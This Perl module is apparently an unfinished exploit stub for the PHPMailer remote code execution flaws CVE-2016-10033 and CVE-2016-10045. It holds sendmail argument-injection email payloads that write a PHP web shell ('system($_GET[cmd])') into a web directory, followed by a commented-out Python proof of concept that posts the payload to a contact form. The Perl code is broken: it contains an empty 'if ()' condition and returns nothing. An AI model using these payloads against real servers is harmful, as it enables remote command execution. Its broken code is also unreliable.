package Spellbook::Exploits::CVE_2016_10045 {
    use strict;
    use warnings;
    use LWP::UserAgent;

    sub new {
        my ($self, $target, $parameter) = @_;
        my @results = ();

        if ($target) {
            my $userAgent = LWP::UserAgent -> new();

            my $shell = "<?php system(\$_GET[cmd]); ?>";
            my $write_dir = "/var/www/html/vendor";

            my $payload = "\"attacker\\\" -oQ/tmp/ -X$write_dir/poc.php  some\"@email.com"; # CVE-2016-10033
            
            if () {
                $payload = "\"attacker\\' -oQ/tmp/ -X$write_dir/phpcode.php  some\"@email.com"; # CVE-2016-10045
            }
        }

        return @results;
    }
}

1;



# import urllib
# import urllib2
# import socket
# import sys

# RW_DIR = "/var/www/html/vendor"
# url = 'http://172.30.0.125/contact.php' # Set destination URL here

# # Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
# # payload = 

# RCE_PHP_CODE = "<?php system($_GET[cmd]) ?>"
# post_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'subject': 'teste', 'message': RCE_PHP_CODE}

# data = urllib.urlencode(post_fields)
# req = urllib2.Request(url, data)
# response = urllib2.urlopen(req)
# the_page = response.read()